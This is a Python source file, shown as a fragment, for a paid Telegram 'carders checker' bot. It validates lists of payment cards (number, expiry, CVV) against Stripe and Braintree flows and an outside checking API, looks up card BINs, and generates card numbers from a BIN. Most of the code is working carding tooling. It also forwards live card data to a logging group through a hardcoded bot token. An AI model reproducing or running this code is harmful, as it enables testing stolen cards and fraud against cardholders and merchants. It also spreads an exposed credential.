    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

    bot.reply_to(message, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(valid_redeem_codes[code])}</b>.", parse_mode="HTML")

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Function to get all registered user IDs from user.txt
def get_registered_users():
    if not os.path.exists(USER_FILE):
        return []
    with open(USER_FILE, "r") as file:
        users = file.readlines()
    return [line.split(",")[0] for line in users]  # Extract user IDs

@bot.message_handler(commands=["broadcast"])
def broadcast_message(message):
    user_id = str(message.from_user.id)

    # Ensure only the owner can broadcast
    if user_id not in owners:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    # Ask the owner what message they want to send
    bot.reply_to(message, "📢 Send the message, sticker, GIF, or video you want to broadcast.")
    bot.register_next_step_handler(message, send_broadcast)

def send_broadcast(message):
    user_id = str(message.from_user.id)

    # Fetch all registered users
    registered_users = get_registered_users()

    # Create inline buttons for Owner and Admin
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("👑 Owner", url="https://t.me/KalkiGamesYT"),
        InlineKeyboardButton("🔥 Bot", url="https://t.me/ServerFreeezerBot?start=_tgr_N_qfZk5lZTM9")
    )

    # Count successful and failed messages
    success_count = 0
    failed_count = 0

    for user in registered_users:
        try:
            if message.text:  # Sending text messages
                bot.send_message(user, message.text, reply_markup=keyboard)
            elif message.photo:  # Sending photos
                bot.send_photo(user, message.photo[-1].file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.sticker:  # Sending stickers
                bot.send_sticker(user, message.sticker.file_id, reply_markup=keyboard)
            elif message.animation:  # Sending GIFs
                bot.send_animation(user, message.animation.file_id, caption=message.caption or "", reply_markup=keyboard)
            elif message.video:  # Sending videos
                bot.send_video(user, message.video.file_id, caption=message.caption or "", reply_markup=keyboard)
            else:
                continue

            success_count += 1  # Increment success count
        except Exception as e:
            print(f"Failed to send to {user}: {e}")
            failed_count += 1

    # Send a completion message to the owner
    bot.send_message(user_id, f"✅ Broadcast completed!\n📨 Sent: {success_count}\n❌ Failed: {failed_count}")

import os

USER_FILE = "user.txt"

# Function to check if a user is registered
def is_registered(user_id):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as file:
        registered_users = file.readlines()
    return str(user_id) in [line.split(",")[0] for line in registered_users]

# Function to register a user
def register_user(user_id, first_name, username):
    with open(USER_FILE, "a") as file:
        file.write(f"{user_id},{first_name},{username}\n")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = str(message.from_user.id)
    first_name = message.from_user.first_name or "Unknown"
    username = message.from_user.username or "No Username"

    # Register user if not already registered
    if not is_registered(user_id):
        register_user(user_id, first_name, username)

    # Check if user is authorized
    if is_user_allowed(user_id):
        response = f"""
<code>╭──────────────────────────
│ 🔥 ᴋᴀʟᴋɪɢᴀᴍᴇꜱʏᴛ 𝙲𝙰𝚁𝙳𝙴𝚁𝚂 𝙲𝙷𝙴𝙲𝙺𝙴𝚁 🔥
╰──────────────────────────</code>

👤 <b>Welcome, {first_name}!</b>  
💠 <b>Username:</b> @{username}  
🔹 <b>User ID:</b> <code>{user_id}</code>  

💳 <b>Send Your Combo, and I Will Check Your CC.</b>  
📌 <b>Use /help to see all features!</b> 🚀  
"""
    else:
        response = f"""
<code>╭──────────────────────────
│ ❌ 𝙰𝙲𝙲𝙴𝚂𝚂 𝙳𝙴𝙽𝙸𝙴𝙳 ❌
╰──────────────────────────</code>

🚫 <b>You Are Not Authorized to Use This Bot.</b>  
💎 Unlock Full Access by Purchasing a Plan:

<code>╭──────────────────────────
│ 💰 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙿𝙻𝙰𝙽𝚂 💰
╰──────────────────────────</code>

⏳ <b>1 Day:</b> 60 RS  
📆 <b>7 Days:</b> 180 RS  
🗓️ <b>1 Month:</b> 400 RS  
🔱 <b>Lifetime:</b> 800 RS  

📩 <b>Contact:</b> <a href='https://t.me/KalkiGamesYT'>@KalkiGamesYT</a> to Buy Premium!  

🚀 <b>For Free Access, Use:</b> /help  
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


LOGS_GROUP_CHAT_ID = -1002311066679# Replace with your logs group chat ID
owners = {"7795055510", "7795055510"}  # Replace with actual owner IDs

@bot.message_handler(commands=["add"])
def add_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ Please provide a user ID and duration in days. Usage: /add <user_id> <days>")
        return
    
    user_id_to_add = parts[1]
    try:
        days = int(parts[2])
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid number of days. Please enter a valid integer.")
        return
    
    expire_time = time.time() + (days * 86400)
    with open("id.txt", "a") as file:
        file.write(f"{user_id_to_add}:{expire_time}\n")
    
    bot.send_message(user_id_to_add, f"✅ You have been authorized for {days} days. Expires on: {time.ctime(expire_time)}", parse_mode="HTML")
    log_message = (
        f"<b>✅ User Added</b>\n"
        f"👤 <b>User ID:</b> <code>{user_id_to_add}</code>\n"
        f"🕒 <b>Expires on:</b> {time.ctime(expire_time)}"
    )
    bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
    bot.reply_to(message, f"✅ User {user_id_to_add} added successfully for {days} days.")

@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide a user ID to remove. Usage: /remove <user_id>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue  # Skip malformed lines
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ Your access has expired, and you are no longer authorized.")
                continue  # Remove this user
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ User {user_id_to_remove} removed successfully.")
        else:
            bot.reply_to(message, "⚠️ User not found in the authorized list.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Authorization file not found.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {e}")

import time
from datetime import datetime

# Define owners (replace with actual owner IDs)
owners = {"7795055510", "7795055510"}  # Example owner Telegram IDs

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Get current time & day
    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    # Default status
    if user_id in owners:
        status = "👑 Owner 🛡️"
    else:
        status = "⛔ Not-Authorized ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ Authorized User"
                        else:
                            status = "❌ Access Expired"
                        break
    except FileNotFoundError:
        status = "⚠️ Authorization File Missing"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾 🔥
╰──────────────────────────</code>

👤 <b>First Name:</b> {first_name}  
👤 <b>Last Name:</b> {last_name}  
🆔 <b>User ID:</b> <code>{user_id}</code>  
📛 <b>Username:</b> @{username}  
🔗 <b>Profile Link:</b> {profile_link}  
📋 <b>Status:</b> {status}  

<code>╭──────────────────────────
│ 🕒 𝚃𝙸𝙼𝙴 & 𝙳𝙰𝚃𝙴 📆
╰──────────────────────────</code>

🕒 <b>Time:</b> {current_time}  
📆 <b>Day:</b> {current_day}  

<code>╭──────────────────────────
│ 🚀 ᴋᴀʟᴋɪɢᴀᴍᴇꜱʏᴛ 𝙲𝙷𝙴𝙲𝙺𝙴𝚁𝚂 𝙱𝙾𝚃 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

def is_bot_stopped():
    return os.path.exists("stop.stop")

@bot.message_handler(content_types=["document"])
def main(message):
	if not is_user_allowed(message.from_user.id):
		bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @KalkiGamesYT")
		return
	dd = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
	username = message.from_user.username or "N/A"
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		
	with open("combo.txt", "wb") as w:
		w.write(ee)
		
		start_time = time.time()
		
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			if total > 2001:
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚨 Oops! This file contains {total} CCs, which exceeds the 2000 CC limit! 🚫 Please provide a file with fewer than 500 CCs for smooth processing. 🔥")
				return
				
			for cc in lino:
				current_dir = os.getcwd()
				for filename in os.listdir(current_dir):
					if filename.endswith(".stop"):
						bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @KalkiGamesYTr')
						os.remove('stop.stop')
						return
			
				try:
					data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
					
				except:
					pass
				try:
					bank=(data['bank'])
				except:
					bank=('N/A')
				try:
					brand=(data['brand'])
				except:
					brand=('N/A')
				try:
					emj=(data['country_flag'])
				except:
					emj=('N/A')
				try:
					cn=(data['country_name'])
				except:
					cn=('N/A')
				try:
					dicr=(data['level'])
				except:
					dicr=('N/A')
				try:
					typ=(data['type'])
				except:
					typ=('N/A')
				try:
					url=(data['bank']['url'])
				except:
					url=('N/A')
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"• AUTH ✅: [ {ch} ] •", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"• CCN ✅ : [ {live} ] •", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• DEAD ❌ : [ {dd} ] •", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
𝒃𝒚 ➜ @KalkiGamesYT''', reply_markup=mes)
				
				try:
					last = str(Tele(cc))
				except Exception as e:
					print(e)
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "Your card was declined."
				
				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV/CVV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲:  @KalkiGamesYT'''
				print(last)
				if "requires_action" in last:
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
					live += 1
				elif "Your card does not support this type of purchase." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "Your card's security code is incorrect." in last:
					live += 1
					send_telegram_notification(msg)
					bot.reply_to(message, msg)
				elif "succeeded" in last:
					ch += 1
					elapsed_time = time.time() - start_time
					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Added Successfully

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @KalkiGamesYT'''
					send_telegram_notification(msg1)
					bot.reply_to(message, msg1)
				else:
					dd += 1
					
				checked_count = ch + live + dd
				if checked_count % 50 == 0:
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="Taking a 1-minute break... To Prevent Gate from Dying, Please wait ⏳")
					time.sleep(60)
					bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"Resuming the Process, Sorry for the Inconvience")
					
	except Exception as e:
		print(e)
	bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅

Auth CC : {ch}
CCN : {live}
Dead CC : {dd}
Total : {total}

𝗕𝗢𝗧 𝗕𝗬 ➜ @KalkiGamesYT''')
		
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	with open("stop.stop", "w") as file:
		pass
	bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
	
@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:  # Check if the sender is an owner
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users found.")
                return
            
            # Prepare the message with user IDs and usernames
            user_list = "Authorized Users:\n\n"
            for user_id in allowed_ids:
                user_id = user_id.strip()  # Clean any extra spaces/newlines
                try:
                    user = bot.get_chat(user_id)
                    username = user.username or "No Username"
                    user_list += f"• {username} (ID: {user_id})\n"
                except Exception as e:
                    user_list += f"• User ID: {user_id} (Username not found)\n"
            
            # Send the list to the owner
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt file not found. No authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to view the list of authorized users.")
        
from rich.console import Console

console = Console()
console.print("🔥🔥 [bold magenta]KalkiGamesYT  CARDERS[/bold magenta] 🔥🔥", style="bold yellow")

import html

# Function to check if a user has premium access
def is_premium_user(user_id):
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        valid_users = []
        current_time = time.time()
        user_has_access = False
        for line in lines:
            parts = line.strip().split(":")
            if len(parts) != 2:
                continue
            stored_user_id, expire_time = parts
            expire_time = float(expire_time)
            if expire_time > current_time:
                valid_users.append(f"{stored_user_id}:{expire_time}")
                if str(user_id) == stored_user_id:
                    user_has_access = True
        with open("id.txt", "w") as file:
            file.writelines("\n".join(valid_users) + "\n")
        return user_has_access
    except Exception as e:
        print(f"Error checking access: {e}")
        return False

# Function to get BIN details
def get_bin_details(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Not Available")
            country = f"{data.get('country', {}).get('name', 'Not Available')} {data.get('country', {}).get('emoji', '')}"
            return bank, country
        return "Not Available", "Not Available"
    except Exception as e:
        print(f"Error fetching BIN details: {e}")
        return "Not Available", "Not Available"

@bot.message_handler(commands=['chk'])
def chk_command(message):
    user_id = message.from_user.id

    if not is_premium_user(user_id):
        bot.reply_to(message, "🚫 <b>Premium Access Required!</b>\n<i>You don't have access to this command.</i>", parse_mode="HTML")
        return

    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    card_details = args[1]
    match = re.match(r"^(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$", card_details)

    if not match:
        bot.reply_to(message, "⚠ <b>Invalid Format!</b> Use: <code>/chk CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    card_number, month, year, cvv = match.groups()
    bin_number = card_number[:6]
    user = message.from_user.username or "Unknown"
    start_time = time.time()

    if len(year) == 2:
        current_year = datetime.now().year
        century = int(str(current_year)[:2])
        year = str(century) + year  

    # Fetch BIN Details
    bank, country = get_bin_details(bin_number)

    # Send initial waiting message
    waiting_msg = bot.send_message(message.chat.id, "⏳ <b>Checking Card...</b>\n🔴⚪⚪⚪⚪⚪⚪⚪⚪⚪ (0%)", parse_mode="HTML")

    # Update the percentage bar with color transitions
    progress_stages = [
        ("🔴🔴⚪⚪⚪⚪⚪⚪⚪⚪ (10%)", 0.8),
        ("🔴🔴🟠⚪⚪⚪⚪⚪⚪⚪ (20%)", 0.8),
        ("🔴🔴🟠🟠⚪⚪⚪⚪⚪⚪ (30%)", 0.8),
        ("🔴🔴🟠🟠🟡⚪⚪⚪⚪⚪ (40%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡⚪⚪⚪⚪ (50%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵⚪⚪⚪ (60%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵⚪⚪ (70%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢⚪ (80%)", 0.8),
        ("🔴🔴🟠🟠🟡🟡🔵🔵🟢🟢 (90%)", 0.8),
        ("🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢 (100%)", 0.8),
    ]

    for bar, delay in progress_stages:
        time.sleep(delay)
        bot.edit_message_text(f"⏳ <b>Checking Card...</b>\n{bar}", message.chat.id, waiting_msg.message_id, parse_mode="HTML")

    api_url = f"https://darkboyccapi.onrender.com/key=dark/cc={card_number}|{month}|{year}|{cvv}"
    response = requests.get(api_url)

    if response.status_code != 200:
        bot.edit_message_text(
    f"⚠️ <b>API Error:</b> <code>{html.escape(response.text)}</code>",
    message.chat.id,
    waiting_msg.message_id,
    parse_mode="HTML"
)
        return

    data = response.json()
    status = "✅ Approved" if data.get("status") == "Approved" else "❌ Declined"
    card_response = html.escape(data.get("response", "No response provided"))
    time_taken = round(time.time() - start_time, 2)

    response_text = f"""
🎩 <b>𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲</b> 🎩
━━━━━━━━━━━━━━━━━━━━━
💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{card_details}</code>
📌 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}
📝 <b>𝐂𝐚𝐫𝐝 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {card_response}
━━━━━━━━━━━━━━━━━━━━━
🏦 <b>𝐁𝐚𝐧𝐤:</b> {bank}
🌍 <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country}
⏳ <b>𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧:</b> {time_taken} 𝐬𝐞𝐜
👤 <b>𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:</b> @{user}
━━━━━━━━━━━━━━━━━━━━━
🔹 𝐄𝐱𝐜𝐥𝐮𝐬𝐢𝐯𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐜𝐞𝐬𝐬 ✅
"""

    bot.edit_message_text(response_text, message.chat.id, waiting_msg.message_id, parse_mode="HTML")

import telebot
from braintree_checker import check_braintree

@bot.message_handler(commands=['b3'])
def handle_b3(message):
    """Handles the /b3 command for checking Braintree cards."""
    try:
        card_details = message.text.split(" ", 1)[1]  # Extract card details after command
        check_braintree(bot, message, card_details)
    except IndexError:
        bot.send_message(message.chat.id, "<b>❌ Error:</b> Please provide a card in the format <code>/b3 CC|MM|YYYY|CVV</code>.", parse_mode="HTML")

def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7440283723:AAHs1iPUTL7HHoSVVfESF13lAI8M5jqbZC0/sendMessage"
    data = {'chat_id': -1002311066679, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
@bot.message_handler(commands=["gen"])
def handle_gen_command(message):
    args = message.text.split()

    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: /gen &lt;BIN&gt; [Quantity]\nExample: /gen 457173 5", parse_mode="HTML")
        return

    bin_format = args[1]
    quantity = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10

    try:
        result = generate_credit_card(bin_format, quantity)
        if isinstance(result, str) and result.endswith(".txt"):
            with open(result, "rb") as f:
                bot.send_document(message.chat.id, f, caption=f"✅ Generated {quantity} cards for BIN: {bin_format}")
        else:
            bot.reply_to(message, f"✅ <b>Generated Cards:</b>\n<code>{result}</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: <code>{str(e)}</code>", parse_mode="HTML")

            
    
bot.infinity_polling()

